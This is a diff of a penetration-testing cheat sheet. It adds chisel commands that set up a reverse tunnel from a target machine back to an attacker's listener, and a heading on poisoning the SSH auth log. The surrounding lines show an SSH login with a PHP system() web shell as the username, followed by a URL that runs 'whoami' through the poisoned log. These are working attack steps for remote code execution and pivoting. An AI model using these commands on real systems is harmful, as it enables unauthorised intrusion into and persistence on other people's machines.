@@ -160,6 +160,13 @@ $ kill %1
 
 Login as any user to see that it gets logged then try to login with a malicious php code
 
+### Port Forwarding using chisel
+
+On attacker machine `/chisel_1.7.6_linux_amd64 server -p <port to listen>  --reverse`
+On target machine `./chisel client <attacker>:<attacker_listening_port> R:localhost:<port to forward from target>`
+
+### Poisining ssh auth log
+
 `ssh '<?php system($_GET['a']); ?>'@192.168.43.2` 
 
 Then `http://ip/page?a=whoami;`
